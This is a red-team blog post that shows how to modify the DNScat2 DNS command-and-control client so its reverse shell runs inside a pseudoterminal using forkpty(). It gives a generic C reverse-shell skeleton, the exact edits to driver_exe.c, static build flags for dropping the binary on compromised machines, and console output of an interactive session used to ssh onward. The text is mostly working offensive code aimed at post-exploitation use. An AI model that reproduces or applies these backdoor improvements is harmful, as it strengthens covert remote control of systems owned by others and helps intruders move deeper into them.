---
layout: post
title: Beyond pty.spawn - use pseudoterminals in your reverse shells (DNScat2 example)
date: 2018-05-08 12:00:00
categories: posts
en: true
description: Quick article about how to improve well-known tools used in pentests. Forkpty() FTW!!
keywords: "forkpty, pseudoterminal, shell, backdoor, redteam, pentest"
authors:
    - X-C3LL
---


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Something that boils me since few years ago is the fashion of using "pty.spawn" and similar tricks to get a pseudoterminal. You does not always have python installed in the machine that you just compromised, so if you are going to drop a custom binary in that machine there is no reason to not to do the things "well". Without a pty, stuff like doing a ssh to other server, using sudo, vim, etc. is a pain in the ass. Of course there are tons of tricks to solve this issues, but it is far better if we can avoid to use external help. We can run a child process inside a pseudoterminal just editing few lines. In this post we are going to edit a well-known tool [DNSCat2](https://github.com/iagox86/dnscat2) in order to obtain a shell inside a pty.


## From fork() to forkpty()

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Almost every tool or code snippet used to obtain a reverse shell uses a similar skeleton that we can simplify to something like this:

```c
...
pid = fork();
if (pid == -1) {
	fprintf(stderr, "F*cked!\n");
}

if (pid == 0) { // Child process...
	//Magic is a socket, a pipe, whatever...
	dup2(magic, STDIN_FILENO);
	dup2(magic, STDOUT_FILENO);
	dup2(magic, STDERR_FILENO);
	execlp("/bin/sh", "pwned", NULL);
	exit(0);
}

//Daddy's code...
...
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
We can use fork() to fork our process and call the /bin/sh binary, or we can call the cool __forkpty()__. Forkpty() is where all the magic lies:

```
DESCRIPTION
  The openpty() function finds an available pseudoterminal and returns file descriptors for the master and slave in amaster and aslave.  If name is not NULL, the filename of the slave is returned in name.  If termp is not NULL, the terminal parameters of the slave will be set to the values in termp.  If
  winp is not NULL, the window size of the slave will be set to the values in winp.

  The login_tty() function prepares for a login on the terminal fd (which may be a real terminal device, or the slave of a pseudoterminal as returned by openpty()) by creating a new session, making fd the controlling terminal for the calling process, setting fd to be  the  standard  input,  output,  and
  error streams of the current process, and closing fd.

  The  forkpty()  function  combines openpty(), fork(2), and login_tty() to create a new process operating in a pseudoterminal.  The file descriptor of the master side of the pseudoterminal is returned in amaster, and the filename of the slave in name if it is not NULL.  The termp and winp arguments, if
  not NULL, will determine the terminal attributes and window size of the slave side of the pseudoterminal.
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
So if we use forkpty(), when we do our execlp("/bin/sh"...) the shell process will be run inside a pseudoterminal. No more pty.spawn, expect, script, stty...

## Improving DNScat2
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
It is the moment to put our hands dirty. Download the code from github (https://github.com/iagox86/dnscat2/ ) and vim the file __client/drivers/driver_exe.c__.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
First we are going to add the includes needed:

```c
...
#include <pty.h>
#include <termios.h>
...
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Search the line `driver->pid = fork();` and edit it to use forkpty() (the original code is commented):

```c
/*driver->pid = fork();*/  
   int terminalfd; // We are going to read & write to our child through it

   driver->pid = forkpty(&terminalfd, NULL, NULL, NULL); 
   if(driver->pid == -1)
   {  
LOG_FATAL("exec: couldn't create process (%d)", errno);    
exit(1);
   }  

   /* If we're in the child process... */    
   if(driver->pid == 0)
   {  
/* Copy the pipes.
if(dup2(driver->pipe_stdin[PIPE_READ], STDIN_FILENO) == -1)
  nbdie("exec: couldn't duplicate STDIN handle");   

if(dup2(driver->pipe_stdout[PIPE_WRITE], STDOUT_FILENO) == -1)  
  nbdie("exec: couldn't duplicate STDOUT handle");  

if(dup2(driver->pipe_stdout[PIPE_WRITE], STDERR_FILENO) == -1)  
  nbdie("exec: couldn't duplicate STDERR handle");  

 Execute the new process.
  */  
execlp("/bin/sh", "sh", "-c", driver->process, (char*) NULL);   

/* If execlp returns, bad stuff happened. */   
LOG_FATAL("exec: execlp failed (%d)", errno);  
exit(1);
   }  
```
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
We need to add our "terminalfd" to the "driver" structure:

```c
/* Add the sub-process's stdout as a socket. */      
   /*      
   select_group_add_socket(driver->group, driver->pipe_stdout[PIPE_READ], SOCKET_TYPE_STREAM, driver);        
   select_set_recv(driver->group,driver->pipe_stdout[PIPE_READ], exec_callback);   
   select_set_closed(driver->group,       driver->pipe_stdout[PIPE_READ], exec_closed_callback);     
  */       
  
   struct termios terminal;  
   tcgetattr(terminalfd, &terminal);  // Get the attributes to change few of them
   terminal.c_lflag &= ~ECHO; 
   terminal.c_lflag &= ~ICANON;  
   tcsetattr(terminalfd, TCSANOW, &terminal);  // Set again the attributes
  
   driver->pipe_stdout[PIPE_READ] =  terminalfd; // Use it to read the output of our child  
   driver->pipe_stdin[PIPE_WRITE] = terminalfd; // Use it to write to the input of our child 
  
   select_group_add_socket(driver->group, driver->pipe_stdout[PIPE_READ], SOCKET_TYPE_STREAM, driver);        
   select_set_recv(driver->group,driver->pipe_stdout[PIPE_READ], exec_callback);   
   select_set_closed(driver->group,       driver->pipe_stdout[PIPE_READ], exec_closed_callback);     
```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Lastly we need to add the flags -static (if we want a static compilation just ready to work when it is dropped in a compromised machine) and -lutil to link the libraries needed.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 `make`. Et voilà!

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
When we try to ssh other server using the original version (just download from github and compile), we see the next error message:
```
command (localhost.localdomain) 1> window -i 2
New window created: 2
history_size (session) => 1000
Session 2 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

sh (localhost.localdomain) 2> ssh harlock@localhost
sh (localhost.localdomain) 2> Pseudo-terminal will not be allocated because stdin is not a terminal.

sh (localhost.localdomain) 2> 
```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
With our modified version, everything works like a charm:

```
command (localhost.localdomain) 1> window -i 2
New window created: 2
history_size (session) => 1000
Session 2 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

sh-4.2$
sh (localhost.localdomain) 2> ssh harlock@localhost
sh (localhost.localdomain) 2> harlock@localhost's password: FunkyPassword
sh (localhost.localdomain) 2>
Last login: Wed May  9 09:21:41 2018

[harlock@localhost]->~ ⌚ 13:58:48
```

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
Nice :)!

## Final words

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
We used DNSCat2 as example because it is a really cool project. You can extrapolate the modus operandi and use it in other projects.
As I always say, if you find any typo or wanna comment something, feel free to reach me at twitter [@TheXC3LL](https://twitter.com/TheXC3LL)
